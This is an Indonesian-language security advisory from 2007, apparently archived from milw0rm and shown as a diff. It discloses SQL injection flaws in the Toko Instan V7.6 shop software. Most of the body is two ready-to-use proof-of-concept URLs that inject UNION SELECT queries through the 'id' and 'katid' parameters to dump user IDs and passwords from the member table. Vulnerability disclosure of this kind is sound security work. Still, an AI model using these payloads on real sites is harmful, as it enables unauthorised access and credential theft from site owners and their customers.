@@ -1,0 +1,28 @@
+# Indonesian Newhack Security Advisory
+# ------------------------------------
+# Toko Instan V7.6 - Multiple Remote SQL Injection Vulnerabilities
+# Waktu			:  Nov 14 2007 08:30AM
+# Software		:  Toko Instan V7.6
+# Vendor		:  http://www.tokohandal.com/
+# Demo Site		:  http://www.tokohandal.com/demo/demo2.php
+# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
+# Lokasi		:  Indonesia
+#
+
+// Kutu Pada Berkas "index.php"
+- variabel "id" pada "artikel" tidak terfilter dengan baik sebelumnya sehingga user dapat memanipulasi sql query melalui browser secara remote
+POC ;
+http://korban.site/index.php?cm=artikel&cp=show&id=-1/**/union/**/select/**/null,null,null,null,null,userid,password,null,null/**/from/**/member/*
+
+- variable "katid" pada "produk" tidak terfilter dengan baik sebelumnya sehingga user dapat memanipulasi sql query melalui browser secara remote
+POC ;
+http://korban.site/index.php?cm=produk&cp=show&katid=-1/**/union/**/select/**/null,null,null,null,null,null,null,null,null,null,null,concat(userid,0x3a,password)/**/from/**/member/*
+
+# Terima Kasih untuk;
+# -[opt1lc, fl3xu5, ghoz]-
+# str0ke, DNX, xoron
+# nyubi,iFX,kin9k0ng,bius,selikoer,aldy_BT
+# Komunitas Security dan Hacker Indonesia
+# dan terkhusus untuk mas ghoz, selamat jalan sahabat|rekan jangan lupakan kami disana, kami selalu menanti kedatangan mas ghoz dengan suka cita  :) 
+
+# milw0rm.com [2007-11-14]
